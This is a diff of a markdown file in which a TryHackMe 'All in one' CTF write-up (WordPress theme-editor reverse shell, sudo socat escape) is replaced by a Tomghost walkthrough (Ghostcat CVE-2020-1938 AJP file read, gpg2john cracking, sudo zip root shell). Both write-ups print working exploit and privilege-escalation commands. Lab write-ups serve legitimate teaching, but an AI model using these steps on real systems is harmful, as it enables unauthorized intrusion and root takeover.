@@ -1,144 +1,169 @@
-# All in one CTF (Tryhackme)
+---
+description: >-
+  Recon → Ghostcat file read via AJP → SSH foothold → GPG pivot → sudo zip to
+  root.
+metaLinks:
+  alternates:
+    - https://app.gitbook.com/s/JbMs2bD1gcL5F6LMRlXh/
+---
 
-Target IP: 10.66.191.155\
-Difficulty: Easy&#x20;
+# Tomghost — Ghostcat (CVE-2020-1938) Walkthrough
 
-Link of room:[https://tryhackme.com/room/allinonemj](https://tryhackme.com/room/allinonemj)\
-Author: Oussama Zehri \
-Category: Web Exploitation, Cryptography, Privilege Escalation
+### Scope
 
-{% stepper %}
-{% step %}
-### Phase I: Reconnaissance & Enumeration
+Target: `10.65.179.38`&#x20;
 
-Every successful breach starts with solid intel. Since this was a CTF environment, I opted for an aggressive Nmap scan to quickly map the attack surface.
+Author: Oussama Zehri
 
-{% code title="nmap_scan.txt" %}
+Machine link :[https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)
+
+Goal: get an initial shell, pivot if needed, then escalate to `root`.
+
+{% hint style="warning" %}
+Use these steps only in authorized labs (TryHackMe/HTB/etc).
+{% endhint %}
+
+***
+
+### Recon
+
+Run a full port and service scan:
+
 ```bash
-nmap -T4 -sCV -A 10.66.191.155 -oN nmap_scan.txt
+nmap -sC -sV -p- 10.65.179.38
 ```
-{% endcode %}
 
-Open Ports & Services
+Key findings from the scan:
 
-| Port | Service | Version       | Notes                    |
-| ---: | ------- | ------------- | ------------------------ |
-|   21 | FTP     | vsftpd 3.0.5  | Anonymous Login Enabled. |
-|   22 | SSH     | OpenSSH 8.2p1 | Standard Ubuntu SSH.     |
-|   80 | HTTP    | Apache 2.4.41 | Hosting a WordPress CMS. |
+* `22/tcp` SSH (OpenSSH 7.2p2 Ubuntu)
+* `8009/tcp` AJP/1.3 (Tomcat connector)
+* `8080/tcp` HTTP (Apache Tomcat **9.0.30**)
+
+That combo (`8080` + `8009`) is a strong Ghostcat signal.
+
+***
+
+### Web enumeration (8080)
+
+Directory brute force:
+
+```bash
+gobuster dir -u http://10.65.179.38:8080/ -w /usr/share/wordlists/dirb/common.txt
+```
+
+Interesting endpoint:
+
+* `/manager` (Tomcat Manager)
+
+If you can access the manager page, keep any discovered creds handy. Even if they don’t work there, they often work for SSH.
+
+***
+
+### Vulnerability: Ghostcat (CVE-2020-1938)
+
+Tomcat 9.0.30 is in the vulnerable range for Ghostcat.
+
+The bug sits in AJP (port `8009`). In the common misconfig case, it can allow unauthenticated file reads.
+
+Typical high-value target:
+
+* `WEB-INF/web.xml` (often contains app usernames/passwords or secrets)
 
 {% hint style="info" %}
-Red Team Note: While Anonymous FTP was open, a manual inspection yielded no sensitive files. I immediately pivoted to the Web entry point.
+Ghostcat is primarily **file read / file include**. It can become RCE if you can get a server-side file written and executed.
 {% endhint %}
-{% endstep %}
 
-{% step %}
-### Phase II: Web Discovery
+***
 
-I initiated a directory brute-force using Gobuster to find hidden endpoints.
+### Foothold: read `web.xml` via AJP (8009)
 
-{% code title="gobuster" %}
-```bash
-gobuster dir -u http://10.66.191.155/ -w /usr/share/wordlists/dirb/common.txt
-```
-{% endcode %}
-
-Key Findings:
-
-* /wordpress/: A standard WP installation.
-* /hackathons/: A custom page containing interesting source code comments.
-
-#### The Hidden Breadcrumb
-
-Inspecting the source code of /hackathons/ revealed a cryptic comment:\
-and.\
-This pattern suggested a Vigenère Cipher. In real-world engagements, developers often leave "reminders" in comments that serve as the keys to the kingdom.
-{% endstep %}
-
-{% step %}
-### Phase III: Initial Access
-
-#### Cracking the Vigenère
-
-Using the clues found on the site, I decrypted the string. The result provided the administrative credentials needed for the WordPress dashboard.
-
-#### Exploiting WordPress (RCE)
-
-With Admin access to WordPress, the path to a shell is straightforward via the Theme Editor:
-
-* Navigate to Appearance > Theme Editor.
-* Select `functions.php`.
-* Inject a PHP reverse shell payload.
-* Set up a listener: `nc -nvlp 4444`.
-
-Callback Received:
+Grab a public PoC (one common Searchsploit entry is `48143.py`), then read `web.xml`:
 
 ```bash
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# Example syntax used by common Ghostcat PoCs
+python2 48143.py -p 8009 -f WEB-INF/web.xml 10.65.179.38
 ```
-{% endstep %}
 
-{% step %}
-### Phase IV: Lateral Movement
+From the output, extract credentials you can reuse (often basic-auth style or app creds).
 
-A www-data shell is restricted. I searched for files associated with the user `elyana`:
+Then try SSH with the discovered username/password:
 
 ```bash
-find / -user elyana 2>/dev/null
+ssh <user>@10.65.179.38
 ```
 
-Discovery: `/etc/mysql/conf.d/private.txt`\
-This file contained the plaintext password for `elyana`. Using this, I upgraded my session:
+At this point you should have initial access.
 
-* `sudo su elyana` (or via SSH using the recovered credentials)
-{% endstep %}
+***
 
-{% step %}
-### Phase V: Privilege Escalation (Root)
+### Post-exploitation: pivot material (GPG + key)
 
-To reach the top of the food chain, I checked for sudo misconfigurations:
+If you don’t see the expected flags in the first home directory, enumerate for “interesting” files:
+
+```bash
+ls -la
+find /home -maxdepth 3 -type f -iname "*.asc" -o -iname "*.pgp" 2>/dev/null
+```
+
+In this box, you typically find:
+
+* `tryhackme.asc` (an exported private key)
+* `credential.pgp` (an encrypted blob)
+
+#### Crack the key passphrase (John)
+
+Convert and crack:
+
+```bash
+gpg2john tryhackme.asc > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+#### Import the key and decrypt the PGP
+
+```bash
+gpg --import tryhackme.asc
+gpg --decrypt credential.pgp
+```
+
+You should get credentials for another user (commonly `merlin:<password>`).
+
+Switch user:
+
+```bash
+su - merlin
+```
+
+***
+
+### Privilege escalation: `zip` via sudo (GTFOBins)
+
+Check sudo rights:
 
 ```bash
 sudo -l
 ```
 
-#### The Vulnerability
-
-`elyana` was permitted to run `/usr/bin/socat` as root without a password.
-
-#### The Exploit (GTFOBins Style)
-
-Socat is a powerful networking tool that can be abused to execute a shell with elevated privileges.
+If `zip` is allowed as root, you can pop a root shell using the GTFOBins technique:
 
 ```bash
-sudo /usr/bin/socat stdin exec:/bin/sh
+sudo zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
 ```
 
-Outcome:
+Validate:
 
 ```bash
 id
-uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
 ```
 
-System Compromised.
-{% endstep %}
-
-{% step %}
-### Phase VI: Post-Mortem & Remediation
-
-#### What I Learned
-
-* Vigenère Awareness: Cryptographic obfuscation in CTFs often relies on classic ciphers. Recognizing these patterns saves hours of fruitless brute-forcing.
-* The Power of Sudo: A single binary like `socat` can render all other security layers useless if sudo permissions are too broad.
-
-#### Mitigation Strategies
-
-* Secure Sudoers: Never grant sudo access to binaries that have "shell escape" capabilities (check GTFOBins).
-* Code Sanitization: Remove all developer comments and credentials from production source code.
-* Disable File Editing: Disable the WordPress Theme/Plugin editor by adding `define( 'DISALLOW_FILE_EDIT', true );` to `wp-config.php`.
-{% endstep %}
-{% endstepper %}
-
 ***
+
+### Notes / troubleshooting
+
+* If the Ghostcat PoC returns nothing, verify:
+  * port `8009` is reachable from your host
+  * the AJP connector isn’t protected with `secretRequired="true"`
+* If `/manager` prompts for auth, don’t brute force it blindly. Extract creds from `web.xml` first.
+* If `su` is blocked, try SSHing directly as the second user.
